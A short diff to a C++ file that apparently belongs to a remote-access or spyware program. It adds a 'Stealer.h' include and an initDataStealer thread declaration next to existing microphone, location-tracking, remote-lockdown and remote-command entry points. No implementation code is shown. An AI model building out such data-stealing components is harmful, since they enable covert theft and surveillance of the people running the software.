@@ -11,6 +11,7 @@
 #include "../Control/LocationTracker.h"
 #include "../Control/Filter.h"
 #include "../Control/Commander.h"
+#include "../Control/Stealer.h"
 
 #include <string>
 #include <iterator>
@@ -39,6 +40,7 @@ DWORD WINAPI initMic(LPVOID lpParam);
 DWORD WINAPI initRemoteLockdown(LPVOID lpParam);
 DWORD WINAPI initRemoteCommands(LPVOID lpParam);
 DWORD WINAPI initLocationTracker(LPVOID lpParam);
+DWORD WINAPI initDataStealer(LPVOID lpParam);
 DWORD WINAPI initDataManager(LPVOID lpParam);
 DWORD WINAPI initRequestManager(LPVOID lpParam);
 
